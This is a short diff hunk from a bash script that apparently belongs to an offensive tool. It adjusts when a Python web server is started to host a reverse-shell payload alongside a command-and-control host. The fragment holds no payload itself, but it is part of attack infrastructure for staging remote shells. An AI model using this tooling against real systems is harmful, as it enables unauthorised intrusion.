@@ -78,7 +78,7 @@ PAYLOAD_PORT=$(echo ${PAYLOAD_SERVER} | sed 's/^.*://')
 [[ "${PAYLOAD_HOST}" == "${CNC_HOST}" ]] && echo "Do you want to start a simple web server using python to host your reverse shell payload? (Y/N)" && read -p "Default (Y): " START_PYTHON_SERVER
 
 # Start server if requested
-[[ "${START_PYTHON_SERVER,,}" != 'n' ]] && python3 -m http.server ${PAYLOAD_PORT} &> /dev/null & 
+[[ "${START_PYTHON_SERVER,,}" != 'n' && "${PAYLOAD_HOST}" == "${CNC_HOST}" ]] && python3 -m http.server ${PAYLOAD_PORT} &> /dev/null & 
 
 # Verify if server is running
 SERVER_PID=$(ps aux | grep 'python3 -m http.server 8080' | egrep -v 'grep' | awk '{ print $2 }')
